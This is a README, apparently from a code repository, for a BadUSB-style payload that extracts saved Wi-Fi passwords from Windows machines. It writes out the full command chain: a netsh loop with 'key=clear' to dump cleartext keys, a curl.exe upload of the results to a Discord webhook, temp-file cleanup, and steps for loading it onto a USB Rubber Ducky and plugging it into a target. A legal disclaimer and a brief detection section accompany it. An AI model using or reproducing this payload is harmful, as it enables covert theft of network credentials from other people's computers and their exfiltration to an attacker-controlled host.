```
▄▄▄▄▄▄    ▄▄▄▄▄       ▄▄▄▄▄▄     ▄▄▄▄▄▄  
▄▀   ░  ▀▄ █     ▀▀▄  ▄▀   ░  ▀▄ ▄▀   ░  ▀▄
█ ░▄▀▀▄ ░░ █ ░█▀▄   ▒ █ ░▄▀▀▄ ░░ █ ░▄▀▀▄ ░░
█ ░▒  █░ ▒ █▒░█  █░ ▓ █ ░▒  █▄▀  █ ░▒  █░ ▒
█░░▓  █░░▓ █▒▒▒▄▀░▒░█ █░░▓▄ ▀    █░░▓  █░░▓
█▒░█  █▒▒█ █▒▒▒░░▒▄▀  █▒░▒▒▀▄    █▒░█  █▒▒█
█▒▓▓  ▓▓▓█ █▒▓█▀▄▒▒█  █▒▓▓▀▀▀    █▒▓▓  ▓▓▓█
█▓▓▒  ▒█▓▓ █▓▓█ █▓▒█  █▓▓▒  ▒▄▄  █▓▓▒  ▒█▓▓
██▓░  ░██▒ ▒███ ▒▓██  ██▓░  ░██▒ ██▓░  ░██▒
█ █▀▄▄▀██░ ░██▓ ░██▓  █ █▀▄▄▀██░ █ █▀▄▄▀██░
▀▄      ▄  ▀▄█▒ ▀▄█▒  ▀▄      ▄  ▀▄      ▄ 
  ▀▀▀▀▀▀     ▀░   ▀░    ▀▀▀▀▀▀     ▀▀▀▀▀▀  
```

# 📡 Wi-Fi Password Extractor (Educational)

A BadUSB-style payload that extracts saved Wi-Fi passwords from a Windows machine and exfiltrates them to a Discord webhook.

## ⚠️ Legal Warning

**This tool is for educational purposes and authorized penetration testing only.**

Unauthorized use against systems you do not own or have explicit written permission to test is **illegal** in most jurisdictions (e.g., violates the Computer Fraud and Abuse Act in the US, Computer Misuse Act in the UK, similar laws worldwide).

**You are responsible for your own actions.**

## 📋 Description

When executed on a Windows machine, this payload:
1. Dumps all saved Wi-Fi profiles using `netsh wlan show profile`
2. Extracts the cleartext password for each network
3. Uploads the results as a `.txt` file to a Discord webhook
4. Cleans up the temp file

## 🛠️ Requirements

- Windows 10/11 (or Windows Server with Wi-Fi)
- Administrator privileges
- `curl.exe` (built into Windows 10+)
- A Discord webhook URL (see setup below)

## 🔧 Setup

### 1. Create a Discord Webhook

1. Open Discord → Server Settings → Integrations
2. Click "Webhooks" → "New Webhook"
3. Name it, pick a channel, copy the URL
4. **Never commit the webhook to git**

### 2. Configure the Payload

Replace `YOUR_DISCORD_WEBHOOK_URL` in `payload.txt` with your webhook before encoding/deploying.

### 3. Deploy

**For Hak5 USB Rubber Ducky:**
1. Encode `payload.txt` at https://hak5.github.io/usbrubberducky-payloads/
2. Copy `inject.bin` to the Ducky
3. Plug into target

**For direct testing in CMD (as Admin):**
```batch
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-RestMethod -Uri 'YOUR_DISCORD_WEBHOOK_URL' -Method Post -ContentType 'application/json' -Body '{\"content\":\"test\"}'"
```

## 🧪 Testing

Test in a **virtual machine** before real use:
- VirtualBox: https://www.virtualbox.org/
- VMware: https://www.vmware.com/

**Recommended test setup:**
1. Create a Windows 10 VM
2. Connect to a Wi-Fi network and save the password
3. Run the payload
4. Verify the webhook receives the file

## 🔍 How It Works

```batch
netsh wlan show profile > %TEMP%\wifi.txt
```
Lists all saved Wi-Fi profiles and writes to a temp file.

```batch
for /f "tokens=2 delims=:" %a in ('netsh wlan show profile ^| findstr /C:"All User Profile"') do (netsh wlan show profile name=%a key=clear >> %TEMP%\wifi.txt 2>&1)
```
Loops through each profile, extracts the cleartext password, and appends to the file.

```batch
curl.exe -s -F "file=@%TEMP%\wifi.txt" "YOUR_DISCORD_WEBHOOK_URL"
```
Uploads the file to the Discord webhook.

```batch
del %TEMP%\wifi.txt
```
Cleans up the temp file.

## 🛡️ Detection & Defense

Defenders should monitor for:
- `netsh wlan show profile` execution
- `netsh wlan show profile name=* key=clear` (cleartext key extraction)
- Outbound connections to `discord.com` or `discordapp.com`
- Unexpected `curl.exe` usage
- USB HID device connections

**Mitigations:**
- Endpoint Detection and Response (EDR) tools
- USB port restrictions via Group Policy
- Application whitelisting
- Network monitoring for webhook/Discord traffic
- User education on unknown USB devices

## 📜 License

MIT License — use at your own risk. Authors not responsible for misuse.
